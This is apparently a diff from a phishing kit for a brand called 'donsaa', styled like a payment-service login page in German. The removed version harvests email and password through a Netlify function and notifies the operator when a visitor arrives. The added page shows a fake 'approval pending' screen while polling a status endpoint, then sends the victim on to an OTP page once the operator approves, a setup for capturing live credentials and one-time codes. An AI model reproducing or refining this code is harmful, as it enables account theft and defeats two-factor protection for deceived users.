@@ -2,93 +2,74 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Anmelden bei Ihrem Konto</title>
-    <link rel="stylesheet" href="assets/css/style.css"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Genehmigung ausstehend...</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <style>
+        /* أنماط مخصصة لهذه الصفحة */
+        body { justify-content: center; align-items: center; }
+        .waiting-container { text-align: center; padding: 40px; }
+        .logo-text { font-size: 38px; font-weight: bold; color: #000000; margin-bottom: 40px; display: block; }
+        .security-message { font-size: 18px; color: #000000; font-weight: 500; margin-bottom: 30px; }
+        .spinner-large { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0070ba; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
 
-    <div class="corral">
-        <div class="login-card">
-            
-            <div class="logo-container">
-                <a href="#" class="logo-text">donsaa</a>
-            </div>
-
-            <form id="loginForm" action="/.netlify/functions/process_login" method="post" novalidate>
-                
-                <div class="input-group" id="emailGroup">
-                    <div class="field-wrapper" id="emailWrapper">
-                        <input type="text" id="email" name="login_email" autocomplete="username">
-                        <label for="email">E-Mail oder Handynummer</label>
-                    </div>
-                    <div class="error-text">Erforderlich</div>
-                </div>
-
-                <div class="input-group" id="passwordGroup">
-                    <div class="field-wrapper" id="passwordWrapper">
-                        <input type="password" id="password" name="login_password" autocomplete="current-password">
-                        <label for="password">Passwort</label>
-                    </div>
-                    <div class="error-text">Erforderlich</div>
-                </div>
-
-                <div class="input-group bot-trap" style="display: none !important;">
-                    <div class="field-wrapper">
-                        <input type="text" name="bot_trap" autocomplete="off" tabindex="-1"> 
-                        <label for="bot_trap">Do not fill this field</label>
-                    </div>
-                </div>
-                <a href="#" class="link forgot-link">Passwort vergessen?</a>
-
-                <div class="actions">
-                    <button type="submit" class="btn btn-next" id="btnNext">
-                        <span class="btn-text">Weiter</span>
-                        <div class="spinner"></div>
-                    </button>
-                </div>
-
-                <div class="divider">
-                    <span>oder</span>
-                </div>
-
-                <div class="actions">
-                    <button type="button" class="btn btn-signup">Registrieren</button>
-                </div>
-
-                <div class="lang-selector">
-                    <span class="flag-icon">🇺🇸</span>
-                    <a href="#" class="lang-item active">Englisch</a>
-                    <span>|</span>
-                    <a href="#" class="lang-item">Französisch</a>
-                    <span>|</span>
-                    <a href="#" class="lang-item">Spanisch</a>
-                    <span>|</span>
-                    <a href="#" class="lang-item">Chinesisch</a>
-                </div>
-
-            </form>
+    <div class="waiting-container">
+        <span class="logo-text">donsaa</span>
+        <div class="spinner-large"></div>
+        <div class="security-message">
+            Ihre Anforderung wird überprüft. Bitte warten Sie auf die Genehmigung...
         </div>
     </div>
-
-    <footer class="footer">
-        <ul>
-            <li><a href="#">Kontakt</a></li>
-            <li><a href="#">Datenschutz</a></li>
-            <li><a href="#">Rechtliches</a></li>
-            <li><a href="#">Richtlinien-Updates</a></li>
-            <li><a href="#">Weltweit</a></li>
-        </ul>
-    </footer>
-
-    <script src="assets/js/security_check.js"></script> 
-    <script src="assets/js/login.js"></script> 
+    
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            fetch('/.netlify/functions/load_notify', { method: 'POST' })
-                .then(response => console.log('Visitor notified'))
-                .catch(error => console.error('Error notifying visitor:', error));
+        // ---------------------------------------------------------------
+        // منطق فحص حالة الجلسة (Polling)
+        // ---------------------------------------------------------------
+        document.addEventListener('DOMContentLoaded', function() {
+            // استخراج Session ID من رابط URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const sessionId = urlParams.get('id');
+
+            if (!sessionId) {
+                console.error("Session ID is missing. Redirecting.");
+                window.location.href = '/'; 
+                return;
+            }
+
+            const checkStatus = async () => {
+                try {
+                    // استدعاء دالة Netlify لفحص الحالة
+                    const response = await fetch(`/.netlify/functions/check_status?id=${sessionId}`);
+                    const data = await response.json();
+                    const status = data.status;
+
+                    if (status === 'approved') {
+                        // حالة الموافقة: التوجيه لصفحة OTP
+                        window.location.href = '/otp.html';
+                        clearInterval(pollInterval);
+                    } else if (status === 'rejected') {
+                        // حالة الرفض: التوجيه لصفحة الدخول مجدداً
+                        window.location.href = '/'; 
+                        clearInterval(pollInterval);
+                    }
+                    // إذا كانت pending (قيد الانتظار)، نستمر في الفحص
+                    
+                } catch (error) {
+                    console.error("Error checking session status, retrying...", error);
+                }
+            };
+
+            // بدء الفحص كل 3 ثواني
+            const pollInterval = setInterval(checkStatus, 3000); 
+
+            // فحص فوري عند التحميل
+            checkStatus();
         });
     </script>
+
 </body>
 </html>
